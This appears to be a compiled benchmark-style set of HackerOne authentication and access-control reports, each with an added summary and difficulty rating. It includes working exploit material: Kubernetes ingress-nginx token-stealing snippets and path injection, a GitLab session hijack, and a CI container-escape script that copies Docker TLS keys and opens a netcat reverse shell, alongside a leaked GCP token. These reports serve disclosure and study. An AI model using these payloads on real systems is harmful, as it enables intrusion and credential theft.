Authnz HARD
==================================================

Total reports analyzed: 18

Privilege Escalation Vulnerabilities (6 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1168765: RCE hazard in reporting (via Chromium)
================================================================================
RAW DESCRIPTION:

Summary: Reporting embeds a Chromium that is susceptible to RCEs
Description:
Reporting uses a headless Chromium to generate PNGs and PDFs. This is invoked (at least on Elastic Cloud, ECE and ECK) with --no-sandbox to work at all.
There are RCEs readily available for Chrome, and at least the versions shipped with 7.11 and 7.12 are susceptible to the attached example.
Attached is an adaptation of this exploit: https://github.com/rapid7/metasploit-framework/pull/15007/files#diff-42ae645fcacbd90d93296471ac57e1d734544af7fb082efd607db0a29d197ac4R53
I have not been able to devise a complete chain yet (thus the "hazard"), but anything that enables pointing reporting at attacker-controlled JS would be able to pop an RCE this way. HTML-injection or XSS (even with the CSP a HTML injection will enable a redirect) or an open redirect would enable pointing reporting at custom JS code.
Steps To Reproduce:
Host the attached HTML somewhere, in my case it's available on http://192.168.0.154:8009/alexb-says-hi.html
Point the x-pack reporting-embedded Chromium at it (this step is missing to complete the chain)
Here's an example. The attached HTML file gets uname -a > /tmp/alexb-says-hi to be run:
Code 924 Bytes
1$ docker run --rm -it docker.elastic.co/kibana/kibana:7.12.0 bash  
2bash-4.4$ cd ./x-pack/plugins/reporting/chromium/headless_shell-linux_x64/
3bash-4.4$ ls /tmp/
4ks-script-esd4my7v  ks-script-eusq_sc5
5bash-4.4$ ./headless_shell --no-sandbox http://192.168.0.154:8009/alexb-says-hi.html
6[0419/161441.709455:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
7[0419/161441.725018:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
8[0419/161441.727174:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
9[0419/161441.821129:WARNING:resource_bundle.cc(431)] locale_file_path.empty() for locale
10^C # CTRL-C after a few seconds. Reporting would kill it after a timeout
11bash-4.4$ ls /tmp/
12alexb-says-hi  ks-script-esd4my7v  ks-script-eusq_sc5
13bash-4.4$ cat /tmp/alexb-says-hi
14Linux bd1b285e33b7 4.19.121-linuxkit #1 SMP Thu Jan 21 15:36:34 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
Supporting Material/References:
HTML-file which when accessed via Reporting's headless Chromium triggers an RCE. (Steps to produce that file via msfconsole is embedded in the HTML file as comments)
Impact
Kibana is an HTML-injection (even without full-blown XSS) or an open redirect away from being RCE-able via Reporting.



================================================================================
Vulnerability Description:
The vulnerability involves Kibana's reporting feature using a headless Chromium instance with the --no-sandbox flag, making it susceptible to Remote Code Execution (RCE) if an attacker can control the JavaScript executed by Chromium. This could be achieved through HTML injection, XSS, or open redirect vulnerabilities in Kibana.

Steps to Reproduce:
1. Host the malicious HTML file on a server accessible by the target system
2. Configure Kibana's reporting feature to use the headless Chromium with --no-sandbox flag
3. Point the reporting feature to the hosted malicious HTML file
4. Observe the execution of arbitrary commands on the system
Exploitation Difficulty:
The attack requires understanding of Chromium's sandboxing mechanisms, the implications of the --no-sandbox flag, and how to craft malicious JavaScript to exploit this configuration. Additionally, the attacker needs to find a way to inject or redirect to their malicious content within Kibana's context, which adds to the complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1249583: Authenticated kubernetes principal with restricted permissions can retrieve ingress-nginx serviceaccount token and secrets across all namespaces
================================================================================
RAW DESCRIPTION:

Summary:
Retrieving ingress-nginx serviceaccount token
ingress-nginx allows adding custom snippets of nginx configuration to Kubernetes ingress objects. These snippets can be applied to either the relevant location {} or server {} blocks with the following annotations, respectively.
https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#configuration-snippet
https://kubernetes.github.io/ingress-nginx/user-guide/nginx-configuration/annotations/#server-snippet
Inside the server {} block we can add a custom snippet of lua-code that reads the serviceaccount token that is mounted inside the ingress-nginx pod. We then set it as an nginx variable and return it to the client at a configured location. This might look like this:
Code 396 Bytes
1    nginx.ingress.kubernetes.io/server-snippet: |
2      set_by_lua $token '
3        local file = io.open("/run/secrets/kubernetes.io/serviceaccount/token")
4        if not file then return nil end
5        local content = file:read "*a"
6        file:close()
7        return content
8      ';
9
10      location = /token {
11        content_by_lua_block {
12          ngx.say(ngx.var.token)
13        }
14      }
Impact
The ingress-nginx serviceaccount has the permissions to list secrets across all namespaces. With the ingress-nginx serviceaccount's token a user, with otherwise restricted privileges, can at least:
exfiltrate all kubernetes secrets
get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin
Vendors such as rancher-labs bundle ingress-nginx, or a forked version of ingress-nginx, with their software. Solutions provided by these vendors might also be vulnerable.
kube-apiserver proxy
ingress-nginx can be configured to expose the Kubernetes kube-apiserver by creating a Kubernetes Service of type ExternalName and pointing it to kubernetes.default; the hostname at which the kubernetes api is available inside the cluster. This can expose an otherwise private and protected kube-apiserver to untrusted networks like the internet.
Requirements to exploit
To successfully exploit this vulnerability an attacker would need access to an already authenticated user or serviceaccount that has the permissions to create the following resources inside kubernetes:
ingress
service
Additionally the attacker needs network access to the ingress-nginx-controller loadbalancer or in-cluster service to retrieve the ingress-nginx serviceaccount token. The hostname configured in the ingress object does not necessarily have to resolve to the ingress-nginx-controller's loadbalancer; ingress-nginx will also serve us the token if we manually add the Host-header.
Kubernetes Version:
Any, as far as I am aware. This was tested with AWS EKS 1.20.
Component Version:
Any, as far as I am aware. This was tested with the following release of ingress-nginx:
chart: ingress-nginx-3.33.0
application: 0.47.0
Steps To Reproduce:
I created a proof-of-concept (poc.sh) that requires the following:
A kubernetes cluster with ingress-nginx installed; ingress-nginx should not be restricted to a single namespace
A local kubeconfig file configured to communicate with the kubernetes cluster
A user configured in the kubeconfig file with the permissions to create ingress and service objects in the namespace configured in the kubeconfig context
The proof-of-concept requires setting the INGRESS_HOST environment variable. This variable should contain a hostname that resolves to the ingress-nginx-controller's loadbalancer. This is made easy on clusters where a wildcard DNS-record is pointing to the loadbalancer.
When invoked, the script will:
Apply the required ingress and service;
exposing the ingress-nginx serviceaccount token at https://$INGRESS_HOST/token
proxying all requests to the kubernetes apiserver at https://$INGRESS_HOST
exposing the ingress-nginx serviceaccount token at https://$INGRESS_HOST/token
proxying all requests to the kubernetes apiserver at https://$INGRESS_HOST
Retrieve the ingress-nginx serviceaccount token
Write a local kubeconfig;
Using the kube-apiserver proxy
Using the ingress-nginx serviceaccount token
Using the kube-apiserver proxy
Using the ingress-nginx serviceaccount token
Write secrets from all namespaces to a local file called secrets.json
For each serviceaccount token found in secrets.json check if the serviceaccount has cluster-admin privileges. If so, create a new user and context in the local kubeconfig file with the serviceaccount's token
Supporting Material/References:
file	description
ingress.yaml	kubernetes manifest used to create required service and ingress objects
poc.sh	proof-of-concept written in bash
output.png	output of running poc.sh against local test cluster<br>getting cluster-admin by finding the serviceaccount tokens of flux and flux-helm-operator
Impact
exfiltrate all kubernetes secrets
get tokens of all kubernetes serviceaccounts; allowing an attacker to elevate his privileges to potentially cluster-admin



================================================================================
Vulnerability Description:
An authenticated Kubernetes principal with restricted permissions can retrieve the ingress-nginx serviceaccount token and secrets across all namespaces by exploiting custom nginx configuration snippets. This allows exfiltration of all Kubernetes secrets and potential privilege escalation to cluster-admin.

Steps to Reproduce:
1. Create an ingress object with a custom server-snippet annotation that reads and exposes the ingress-nginx serviceaccount token.
2. Use the exposed token to list secrets across all namespaces and potentially elevate privileges to cluster-admin.
Exploitation Difficulty:
The attack involves multiple components (ingress configuration, serviceaccount tokens, nginx snippets) and requires understanding of both Kubernetes RBAC and nginx configuration. The interaction between these components is non-obvious, particularly the ability to use nginx snippets to expose serviceaccount tokens.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1382919: Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token
================================================================================
RAW DESCRIPTION:

Report Submission Form
Summary:
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).
Kubernetes Version:
1.20 (should work on (1.21 as well)
Component Version:
nginx ingress controller v1.0.4
Steps To Reproduce:
I deployed the latest ingress-controller (v1.0.4).
I used a user (gaf_test) that has the permissions to get, create and update ingress resources
(the “get” permissions is only to allow kubectl to view the newly created resource).
ingress-creator-role.yaml
Code 212 Bytes
1apiVersion: rbac.authorization.k8s.io/v1
2kind: Role
3metadata:
4  name: ingress-creator
5  namespace: default
6rules:
7- apiGroups: ["networking.k8s.io"]
8  resources: ["ingresses"]
9  verbs: ["get", "create", "update"]
ingress-creator-role-binding.yaml
Code 292 Bytes
1apiVersion: rbac.authorization.k8s.io/v1
2kind: RoleBinding
3metadata:
4  name: gaf_test-ingress-creator-binding
5  namespace: default
6subjects:
7- kind: User
8  name: gaf_test
9  apiGroup: rbac.authorization.k8s.io
10roleRef:
11  kind: Role
12  name: ingress-creator
13  apiGroup: rbac.authorization.k8s.io
<image_0>
Use this user (gaf_user) to create a new ingress resource in the default namespace.
ingress.yaml
Code 413 Bytes
1apiVersion: networking.k8s.io/v1
2kind: Ingress
3metadata:
4  name: gaf-ingress
5  annotations:
6    kubernetes.io/ingress.class: "nginx"
7spec:
8  rules:
9  -  http:
10      paths:
11        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
12          pathType: Prefix
13          backend:
14            service:
15              name: some-service
16              port:
17                number: 5678
Code 29 Bytes
1kubectl apply -f ingress.yaml
<image_1>
Access to nginx ingress loadbalancer to /gaf/token path.
https://<host>/gaf/token
<image_2>
<image_3>
The nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.
The Root Cause
When a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.
I caused a “config file injection” using the following payload as path:
/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
The payload above creates the following configuration for nginx:
/etc/nginx/nginx.conf
<image_4>
This is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)
that maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.
Impact
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).



================================================================================
Vulnerability Description:
A user with permissions to create an ingress resource can inject a malicious path configuration that exposes the ingress-nginx service account token, which has cluster-wide permissions to list secrets in all namespaces.

Steps to Reproduce:
1. Deploy the latest ingress-controller (v1.0.4) and create a user with permissions to get, create, and update ingress resources.
2. Create an ingress resource with a malicious path configuration that injects an alias directive to expose the service account token directory.
3. Access the exposed service account token via the manipulated path on the nginx ingress load balancer.
Exploitation Difficulty:
The vulnerability requires knowledge of nginx configuration directives and the ability to manipulate ingress resources to inject malicious paths. The interaction between the ingress resource and the nginx configuration is non-obvious and requires understanding of both Kubernetes RBAC and nginx alias directives.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/304378: ACME TLS-SNI-01/02 challenge vulnerable when combined with shared hosting providers
================================================================================
RAW DESCRIPTION:

The ACME TLS-SNI-01 (and TLS-SNI-02) specification assumed wrong in terms of how current major cloud providers routed and validated domains. This was reported earlier this week to Let's Encrypt, and they decided to disable the method. Today Let's Encrypt decided to sunset both TLS-SNI-01 and TLS-SNI-02 due to the vulnerability I found.
A full writeup of the finding and my side of the timeline can be found here:
How I exploited ACME TLS-SNI-01 issuing Let's Encrypt SSL-certs for any domain using shared hosting
Here is Let's Encrypt first and second announcement about the reported issue:
2018.01.09 Issue with TLS-SNI-01 and Shared Hosting Infrastructure
2018.01.11 Update Regarding ACME TLS-SNI and Shared Hosting Infrastructure
Regards,
Frans
Impact
The ability to issue SSL-certificates for domains not under the attacker's control but served using the same shared hosting provider.



================================================================================
Vulnerability Description:
The ACME TLS-SNI-01 and TLS-SNI-02 challenges were vulnerable to exploitation when used with shared hosting providers. The vulnerability allowed an attacker to issue SSL certificates for domains not under their control but served by the same shared hosting provider, due to incorrect assumptions about how cloud providers routed and validated domains.

Steps to Reproduce:
1. Identify a shared hosting provider that serves multiple domains under the same IP address.
2. Use the ACME TLS-SNI-01/02 challenge to request a certificate for a target domain hosted on the same shared hosting provider.
3. Exploit the shared hosting provider's routing mechanism to validate the challenge for the target domain, thereby obtaining a certificate for a domain not under your control.
Exploitation Difficulty:
The vulnerability involves understanding the ACME protocol's TLS-SNI challenges, the routing mechanisms of shared hosting providers, and the subtle interaction between these components that allows for certificate issuance bypass. The attack requires manipulating the validation process in a non-obvious way by leveraging shared infrastructure.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/493324: Privilege escalation from any user (including external) to gitlab admin when admin impersonates you
================================================================================
RAW DESCRIPTION:

Summary:
Hey team,
I have discovered a way for any logged in user (attacker) to escalate his privileges to gitlab administrator if the real gitlab administrator impersonates attacker's account.
Description:
When the gitlab admin impersonates some user, he gets new _gitlab_session cookie and then clicking at Stop impersonating he gets his own admin's cookie back. The vulnerability is that the impersonated user (attacker in our case) can see impersonated session at the Active sessions so he can switch to it (manually setting it in cookie) and click Stop impersonating by himself. This is a way how he can become gitlab administrator.
Steps To Reproduce:
Sign into gitlab app as some user (attacker)
Go to the active sessions settings tab and revoke all the sessions besides the current active one
Sign into gitlab app in other browser as administrator (admin)
Go to users admin section and impersonate attacker user
<image_0>
Inspect the Revoke button and make sure you see the session ID there. Copy it. ████
Go to index page of gitlab as attacker (http://gitlab.bb/ in my case), I do not know why, but it is important step
Clear attacker browser's cookie
Open the developer console as attacker and manually set _gitlab_session to the copied one with:
Code 42 Bytes
1document.cookie = "_gitlab_session=█████";
<image_1>
Click Stop impersonating at the top-right corner as attacker and make sure you are now logged in as gitlab admin. ███
Impact
Every gitlab authenticated user can escalate his privileges to admin ones and give complete access to all gitlab services, projects and abilities. Only he needs to do is ask admin to impersonate his account because of something works bad there.



================================================================================
Vulnerability Description:
This vulnerability allows a regular GitLab user to gain administrator privileges when an administrator uses the impersonation feature to access their account. The issue occurs because the impersonated user can access and hijack the administrator's impersonation session, then exit the impersonation mode to gain the administrator's original privileges.

Steps to Reproduce:
1. Login to GitLab as a normal user (the 'attacker')
2. Navigate to the Active Sessions settings tab
3. Revoke all sessions except your current active session
4. Have a GitLab administrator login (in a different browser) and impersonate your account
5. As the attacker, refresh your Active Sessions page - you'll now see a second active session (this is the administrator's impersonation session)
6. Inspect the 'Revoke' button for this second session and copy the session ID
7. Navigate to the GitLab homepage (http://gitlab.bb/ in the example)
8. Clear your browser cookies
9. Open developer console and manually set the GitLab session cookie to the copied session ID
10. Refresh the page - you are now in the administrator's impersonation session
11. Click 'Stop impersonating' in the top-right corner
12. You now have full administrator access to GitLab
Exploitation Difficulty:
This vulnerability involves understanding how the session impersonation feature works in different contexts, one from the user side and one from the admin side. It also contains a non-obvious interaction logic between the impersonated and impersonator, namely that the current session ID of the impersonator would be saved and stored on the client side, and readable to the impersonated user.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/910300: Email Confirmation Bypass in your-store.myshopify.com which leads to privilege escalation
================================================================================
RAW DESCRIPTION:

Hello Shopify, I have found a bug by which I can verify any email on .myshopify.com, the bug is very strange but it works. Also I can take over the accounts but only the ones which do not have SSO.
To reproduce please follow the steps exactly as I written otherwise you will not be able to reproduce it.
Steps to reproduce:
<image_0>
<image_1>
<image_2>
<image_3>
<image_4>
<image_5>
<image_6>
In burp check match and replace again to replace your email with the email you want to takeover(same as above)
Go to your email which you own where is the confirmation link and click on it(in the browser where you are already logged in)
<image_7>
Now click on Review accounts
Enter stores password and you'll be greeted with Shopify ID
<image_8>
<image_9>
<image_10>
Now you can access vitims store and partner account without any problems
Impact
Ability to confirm any email on your-store.myshopify.com and leverage SSO to take over accounts.



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to bypass email confirmation on .myshopify.com, enabling them to verify any email and potentially take over accounts that do not use SSO. By manipulating the email confirmation process, the attacker can gain unauthorized access to the victim's store and partner account.

Steps to Reproduce:
1. Use Burp Suite to intercept and replace the email in the confirmation request with the target email.
2. Click the confirmation link in the browser where you are already logged in.
3. Navigate to 'Review accounts' and enter the store's password.
4. Access the victim's store and partner account via Shopify ID.
Exploitation Difficulty:
The attack involves multiple components including email interception, session manipulation, and exploiting the confirmation process. The interaction between these components is subtle and requires precise execution to succeed. Additionally, the attack manipulates complex application states during the email confirmation and account review phases.

--------------------------------------------------------------------------------



Improper Access Control - Generic Vulnerabilities (4 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1442118: Container escape on public GitLab CI runners
================================================================================
RAW DESCRIPTION:

Summary
It is possible to circumvent the isolation in place for build jobs running on public CI runners by escaping the docker container running the build job.
This is possible via abuse of the cgroup release_agent functionality, made possible by CI jobs being allowed to mount filesystems inside the container.
From this host, I was able to spawn a root remote shell and run whatever I liked without restriction, including bypassing the iptables rules put in place to prevent access to the GCP metadata API. I was also able to gather sensitive data such as the instance token, GCP project ID and instance configuration, docker host TLS keys, firewall details, suricata configuration and user account names for the ops team, which could aid in further exploitation for a motivated attacker.
Steps to reproduce
Sign up for a regular, free GitLab account.
Create a new project. An example repo is here: https://gitlab.com/ec0bb/citest (made private)
Add the below .gitlab-ci.yaml
Code 55 Bytes
1image: python:latest
2run:
3  script:
4    - bash shell.sh
Add the below shell.sh
Code 900 Bytes
1export HOST=your.reverse.shell.box # customise this!
2
3mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
4echo 1 > /tmp/cgrp/x/notify_on_release
5export host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
6echo "$host_path/cmd" > /tmp/cgrp/release_agent
7
8touch /user/txt
9touch /ca.pem
10touch /server.pem
11touch /server-key.pem
12touch /ps.txt
13echo '#!/bin/sh' > /cmd
14echo "whoami > $host_path/user.txt" >> /cmd
15echo "ps uax > $host_path/ps.txt" >> /cmd
16echo "cat /etc/docker/ca.pem > $host_path/ca.pem" >> /cmd
17echo "cat /etc/docker/server.pem > $host_path/server.pem" >> /cmd
18echo "cat /etc/docker/server-key.pem > $host_path/server-key.pem" >> /cmd
19echo "mount -o bind /var/run/docker.sock $host_path/docker.sock" >> /cmd
20echo "/usr/bin/nc $HOST 1337 -e /bin/sh &" >> /cmd
21chmod a+x /cmd
22
23while test 1
24do
25  sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
26  sleep 60
27done
Push the files to the repository.
Enable CI/CD jobs on the repository, in case they aren't, using the .gitlab-ci.yml in the repository.
Set up a reverse shell listener with nc -lvp 1337 on the host you specified in the bash script above.
Run the job
Impact
Based on the host configuration, there is a clear expectation that CI jobs should not have access to the host, given the use of $DOCKER_USER in the firewall rules, and the configuration in place to prevent access to GCP metadata and host configuration in the way the container is configured.
Being able to break this confinement allows for unconstrained resource usage on the CI host, as well as access to GCP resources and also other hosts on the internal GCP network. It is also possible to disable iptables and suricata entirely - so arbitrary software and docker images can also be downloaded and run, to facilitate things like cryptocoin mining, something the host has been configured to try and prevent via iptables and suricata rules. This could be used by an attacker to consume significant compute resources in the form of bandwidth usage and compute time, given how easy it is to spin up multiple GitLab accounts, and to restart jobs programmatically when the maximum execution time is reached.
I did not see any evidence of shared jobs in my testing, however if multiple jobs were scheduled on a dedicated runner (which I did not test) then this could also lead to a loss of confidentiality between jobs, as the full container configuration and contents are accessible once the container is escaped.
Examples
Repo: https://gitlab.com/ec0bb/citest
GCP access (albeit limited) -
Code 5.42 KiB
1curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
2{"access_token":"ya29.c.b0AXv0zTPHcDsuE3JOIVaFex7mGac13DuX3nI8XvoeSTANd0HfWmJ8BaTiE0P8GGRBVjOH3--Bangi4UVHqBpR7hLsfielnvZd5VWsRVM9xedCsFchJ1VlIl_RHRAgndu79QhAdEtquGQ9FVw8K_v-beS5zXMSh2DZNEfrUx6IgkAF3skn2sAkxg89XQm5gm067YQIAoaPlyI","expires_in":3326,"token_type":"Bearer"}
3
4ya29.c.b0AXv0zTO_ny6xsfw0m5_YDMjdRUJbxx4jtnhEvrHEBghVmwDPL8GYx8UEQyB2spVmqtEy4IO_1kIONyCny-qwV7bi32okDSc8eNSTwXDUynLVayT3O0OiQ_FOCBlIMaU8Afx_Cbnr3xM7okiaMie0OWkRt4rHnYakWzXUZ_skTaLtN75GASDhs-mqFBe2LPFhj58eGf7DnFNk
5token bb
6
7
8
9
10instance/attributes/cos-update-strategy update_disabled
11instance/attributes/sshKeys cos:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHZ9aaQ4+W
12humgGQokzT+0zX+bS6AkSbs/JYeuoV8Sdb2cp88txEWoozuamR/S6MXp0lHF7hD2hmClvk5LESQLo9pe
13FWXu8U1RZnYyN/pgAA3SpiLaWppxaEd5s5Ry/EXMLunbShenhpg05aby26wBHnBINU4ERITySAW362xT
14zovivE+RA+yWUcuZUzpGTAGOeSqJpH7Gg4g86jMof7IG0Ybixt6LgRhK8tX6ryUw8eqWaAPwB4W/nQ6T
15n2Eup21246PzVqMMhxo4O1dO2g7e2Jyqehvo7Yf5avc4kQ7h2LBrt033Esk1V5XFdzb++1kQxVkEUFor
16wID4cGmMb0Av cos
17
18instance/attributes/user-data #cloud-config
19
20write_files:
21- path: /etc/systemd/system/docker.service.d/20-run-binfmt-container.conf
22  permissions: 0644
23  owner: root
24  content: |
25    [Service]
26    ExecStartPost=docker run --rm --privileged linuxkit/binfmt:v0.8
27
28- path: /etc/systemd/system/docker.service.d/05-iptables-restore-wants.conf
29  permissions: 0644
30  owner: root
31  content: |
32    [Unit]
33    Wants=network-online.target containerd.service iptables-restore.service
34:
35- path: /etc/systemd/system.conf
36  permissions: 0644
37  owner: root
38  content: |
39    [Manager]
40    # Defaults from Google Container Optimized OS
41    DefaultCPUAccounting=yes
42    DefaultBlockIOAccounting=yes
43    # Our custom timeout to speed-up VM shutdown
44    # see: https://gitlab.com/gitlab-com/gl-infra/infrastructure/-/issues/13826#
45note_632590419
46    DefaultTimeoutStopSec=5s
47
48- path: /var/lib/cloud/scripts/per-boot/00-enable-swap
49  permissions: 0755
50  owner: root
51  content: |
52    #!/usr/bin/env sh
53
54    sysctl vm.disk_based_swap=1
55    fallocate -l 2G /var/swapfile
56    chmod 600 /var/swapfile
57    mkswap /var/swapfile
58    swapon /var/swapfile
59
60- path: /var/lib/cloud/scripts/per-boot/01-configure-custom-sysctl
61  permissions: 0755
62  owner: root
63  content: |
64    #!/usr/bin/env sh
65
66    # Required for Elasticsearch docker images to function:
67    # https://gitlab.com/gitlab-com/infrastructure/issues/1687
68    sysctl vm.max_map_count=262144
69
70    # Swap is available, but not preferred
71    sysctl vm.swappiness=10
72
73instance/cpu-platform Intel Haswell
74instance/description docker host vm
75instance/disks/0/device-name persistent-disk-0
76instance/disks/0/index 0
77instance/disks/0/interface SCSI
78instance/disks/0/mode READ_WRITE
79instance/disks/0/type PERSISTENT
80instance/hostname runner-jlguopmm-shared-1641423520-3feb5440.c.gitlab-ci-plan-fr
81ee-6-f2de7a.internal
82instance/id 8450900684160343118
83instance/image projects/gitlab-ci-155816/global/images/runners-cos-stable-v20210
84720-0
85instance/legacy-endpoint-access/0.1 0
86instance/legacy-endpoint-access/v1beta1 0
87instance/licenses/0/id 6880041984096540132
88instance/licenses/1/id 1001010
89instance/licenses/2/id 166739712233658766
90instance/machine-type projects/745008255720/machineTypes/n1-standard-1
91instance/maintenance-event NONE
92instance/name runner-jlguopmm-shared-1641423520-3feb5440
93instance/network-interfaces/0/access-configs/0/external-ip 35.185.3.50
94instance/network-interfaces/0/access-configs/0/type ONE_TO_ONE_NAT
95instance/network-interfaces/0/dns-servers 169.254.169.254
96instance/network-interfaces/0/gateway 10.10.8.1
97instance/network-interfaces/0/ip 10.10.10.75
98instance/network-interfaces/0/mac 42:01:0a:0a:0a:4b
99instance/network-interfaces/0/mtu 1460
100instance/network-interfaces/0/network projects/745008255720/networks/ephemeral-r
101unners
102instance/network-interfaces/0/subnetmask 255.255.248.0
103instance/preempted FALSE
104instance/remaining-cpu-time -1
105instance/scheduling/automatic-restart TRUE
106instance/scheduling/on-host-maintenance MIGRATE
107instance/scheduling/preemptible FALSE
108instance/service-accounts/default/aliases default
109instance/service-accounts/default/email ephemeral-runner@gitlab-ci-plan-free-6-f
1102de7a.iam.gserviceaccount.com
111instance/service-accounts/default/scopes https://www.googleapis.com/auth/logging
112.write
113instance/service-accounts/default/scopes https://www.googleapis.com/auth/monitor
114ing.write
115instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
116viceaccount.com/aliases default
117instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
118viceaccount.com/email ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gservice
119account.com
120instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
121viceaccount.com/scopes https://www.googleapis.com/auth/logging.write
122instance/service-accounts/ephemeral-runner@gitlab-ci-plan-free-6-f2de7a.iam.gser
123viceaccount.com/scopes https://www.googleapis.com/auth/monitoring.write
124instance/tags docker-machine
125instance/virtual-clock/drift-token 0
126instance/zone projects/745008255720/zones/us-east1-c
127project/attributes/disable-legacy-endpoints TRUE
128project/attributes/serial-port-logging-enable false
129project/numeric-project-id 745008255720
130project/project-id gitlab-ci-plan-free-6-f2de7a
131
132computeMetadata/v1/instance/service-accounts/default/scopes \  
133>     -H 'Metadata-Flavor:Google'
134https://www.googleapis.com/auth/logging.write
135https://www.googleapis.com/auth/monitoring.write
docker access
Code 1013 Bytes
1root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # docker ps
2CONTAINER ID        IMAGE                                                      COMMAND                  CREATED             STATUS              PORTS               NAMES
3a40074c0d2c5        a5d7930b60cc                                               "sh -c 'if [ -x /usr…"   25 minutes ago      Up 25 minutes                           runner-jlguopmm-project-27556964-concurrent-0-1abba63760b4a3af-build-2
48c1dbc222094        quay.io/gitlab/gitlab-runner-docker-cleanup:latest         "go-wrapper run"         5 months ago        Up 26 minutes                           gitlab-runner-docker-cleanup
5fa185f65bc99        registry.gitlab.com/gitlab-org/ci-cd/suricata-runner:0.3   "/sbin/init"             5 months ago        Up 26 minutes                           suricata
617e19eb0ac0b        quay.io/prometheus/node-exporter:v1.0.1                    "/bin/node_exporter …"   5 months ago        Up 26 minutes                           node-exporter
runner TLS keys for communicating with the runner manager (also used for logstash auth)
Code 205 Bytes
1root@runner-jlguopmm-shared-1641423520-3feb5440 /etc # file /mnt/stateful_partition/assets/ssl/*
2runner.ca.crt:     PEM certificate
3runner.client.crt: PEM certificate
4runner.client.key: PEM RSA private key
Impact
Unconfined remote code execution on CI host machines
Access to GCP API
Access to internal GCP network



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to escape the Docker container isolation on public GitLab CI runners by abusing the cgroup release_agent functionality. This leads to unconfined remote code execution on the host machine, access to GCP API, and internal network resources.

Steps to Reproduce:
1. Sign up for a regular, free GitLab account.
2. Create a new project and add the provided .gitlab-ci.yaml and shell.sh files.
3. Push the files to the repository and enable CI/CD jobs.
4. Set up a reverse shell listener on the specified host.
5. Run the job to trigger the container escape.
Exploitation Difficulty:
The attack involves multiple components (cgroup manipulation, filesystem mounting, reverse shell setup) and requires understanding of Docker internals and cgroup functionality. The interaction between these components is non-obvious, and the attack manipulates complex system states to achieve container escape.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1567186: One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com
================================================================================
RAW DESCRIPTION:

Hi,
Description
I've been researching new ways to steal OAuth codes and access-tokens using postMessage, and I found a way for me to steal the code and/or access-token from Apple-sign-in on reddit.com allowing a full account hijack of the account in Reddit.
The way it works is this:
Attacker prepares a state-parameter in its own browser from the regular Apple sign-in flow in Reddit. This is an important part on how we get the code.
Attacker makes a page for the victim with the attacker's state attached to it. The page loads an iframe with www.redditmedia.com, which is an intentional sandbox but with a fun quirk, it uses window.name of the frame to pass over query parameters for the current URL in the main window of Reddit. This also includes fragment, which is what we need to get the tokens.
The javascript in the www.redditmedia.com sandbox will create a link to Apple sign-in for Reddit, but tainted with the state-value that the attacker set. Also, the response_type is modified from code to code+id_token and the response_mode to fragment. This is the second important part why we can steal the code, since Reddit uses response_mode=web_message live, to get the message as a postMessage from the login popup, but the other response modes in Apple-ID are not disabled by Reddit. Reddit is not expecting to get any sensitive tokens in the URL fragment. Also, the redirect_uri set in the OAuth-application in Apple for Reddit is allowing https://reddit.com only as the return page. This is something you need to remove, or point elsewhere. When you're using response_mode=web_message, the redirect_uri doesn't really matter what it is set to, since the whole origin of https://reddit.com will be allowed to get the postMessage. But since we now can direct the tokens to Reddit's main page, we have the iframe of www.redditmedia.com there to catch the tokens.
Victim clicks the link from the attacker page, will go through "sign-in with Apple" for Reddit, but with the attacker's state-parameter. When the login process is completed, the URL of the main page becomes https://reddit.com/#state=xxx&code=xxx&access_token=xx.
The XSS on www.redditmedia.com in the first window, which has the same domain as the iframe, will be allowed to ask about the window.name of the iframe in the main window, since it's the same origin as the iframe on the attacker's page. It will then be able to steal the current URL that has the tokens in it.
Here's a video to show the flow, as you will see in the beginning - the attacker has the red profile in Chrome. He will open his own session with Apple and copy the state to the attacker-page, and then send the link to the victim (in the gray profile of Chrome). When the code shows up on the attacker's page later, that's where the attacker then takes over again and uses its incognito browser window to sign in as the victim by posting the postMessage from his Apple-ID sign in popup to Reddit:
And here's a link for testing:
Code 48 Bytes
1https://fransrosen.com/reddit-hijack-424342.html
Technical details
Here's the HTML of the malicious page:
Code 3.07 KiB
1<html>
